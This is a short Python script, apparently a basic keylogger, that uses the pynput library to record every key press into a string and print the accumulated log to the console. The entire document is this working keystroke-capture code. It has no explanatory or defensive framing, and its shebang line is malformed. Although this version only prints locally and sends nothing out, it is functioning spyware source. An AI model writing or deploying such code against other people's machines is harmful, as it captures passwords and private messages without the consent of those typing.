#! /usr/bin/bash//venv/python

import pynput.keyboard
log = ""
def catchKey(key):
    global log

    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "
    print(log)

keyboardListener = pynput.keyboard.Listener(on_press=catchKey)
with keyboardListener:
    keyboardListener.join()